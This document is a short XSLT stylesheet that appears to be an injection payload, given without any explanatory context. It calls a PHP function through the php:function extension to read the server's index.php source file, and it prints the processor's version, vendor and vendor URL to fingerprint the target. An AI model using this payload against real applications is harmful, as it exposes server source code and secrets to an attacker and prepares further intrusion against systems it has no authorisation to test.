<xsl:stylesheet xmlns:xsl = "http://www.w3.org/1999/XSL/Transform" 
		version = "1.0" 
		xmlns:php = "http://php.net/xsl" >

	<xsl:output method = "html" />

		<xsl:template match = "/" >
			<xsl:value-of select="php:function('readfile','index.php')" />
			<xsl:text >	Version :  </xsl:text>
			<xsl:value-of select = "system-property('xsl:version')" />
			<xsl:text >	Vendor :  </xsl:text>
				<xsl:value-of select = "system-property('xsl:vendor')" />
			<xsl:text >	URL :  </xsl:text>
			<xsl:value-of select = "system-property('xsl:vendor-url')" />
		</xsl:template>
</xsl:stylesheet>
